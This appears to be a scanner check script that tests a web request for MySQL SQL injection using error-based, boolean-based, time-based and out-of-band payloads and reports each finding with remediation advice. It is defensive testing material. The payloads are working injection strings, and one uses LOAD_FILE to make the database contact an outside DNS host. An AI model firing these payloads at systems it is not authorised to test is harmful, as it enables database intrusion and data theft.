# Comprehensive SQL Injection Detection for MySQL
# Tests error-based, boolean-based, time-based, and OOB SQLi

given insertion_point: "request"

# Extract original response for baseline comparison
extract original_body from response.body
extract original_status from response.status
extract original_time from response.time

# 1. Error-Based SQLi: Inject single quote to trigger syntax error
send request:
  replace insertion_point with insertion_point + "'"
if regex `SQL syntax.*error|unclosed quotation|mysql_fetch` in response.body then
  report issue:
    severity: high
    confidence: certain
    name: "SQL Injection (Error-Based)"
    detail: "SQL error detected with payload: {insertion_point + '''}. Response: {regex `SQL syntax.*error|unclosed quotation|mysql_fetch`}"
    remediation: "Use parameterized queries or prepared statements."
end if

# 2. Boolean-Based Blind SQLi: Check for response content change
send request:
  replace insertion_point with insertion_point + "' AND 1=1--"
extract true_response from response.body

send request:
  replace insertion_point with insertion_point + "' AND 1=2--"
extract false_response from response.body

if true_response != false_response and true_response == original_body then
  report issue:
    severity: high
    confidence: firm
    name: "SQL Injection (Boolean-Based Blind)"
    detail: "Response changed between true (1=1) and false (1=2) conditions. True payload: {insertion_point + ''' AND 1=1--'}"
    remediation: "Validate and sanitize inputs; use parameterized queries."
end if

# 3. Time-Based Blind SQLi: Inject SLEEP to detect delay
send request:
  replace insertion_point with insertion_point + "' AND IF(1=1, SLEEP(5), 0)--"
  set timeout to 10 seconds
if response.time > original_time + 5000 then
  report issue:
    severity: high
    confidence: tentative
    name: "SQL Injection (Time-Based Blind)"
    detail: "Response delayed by {response.time - original_time}ms with payload: {insertion_point + ''' AND IF(1=1, SLEEP(5), 0)--'}"
    remediation: "Use prepared statements to prevent injection."
end if

# 4. Out-of-Band SQLi: Use Collaborator for DNS-based detection
send request:
  replace insertion_point with insertion_point + "'; SELECT LOAD_FILE(CONCAT('\\\\', 'test.', collaborator_address, '\\foo'))--"
if dns interactions then
  report issue:
    severity: high
    confidence: certain
    name: "SQL Injection (Out-of-Band)"
    detail: "DNS interaction detected via Collaborator with payload: {insertion_point + '''; SELECT LOAD_FILE(CONCAT('\\\\', 'test.', collaborator_address, '\\foo'))--'}"
    remediation: "Implement strict input validation and parameterized queries."
end if
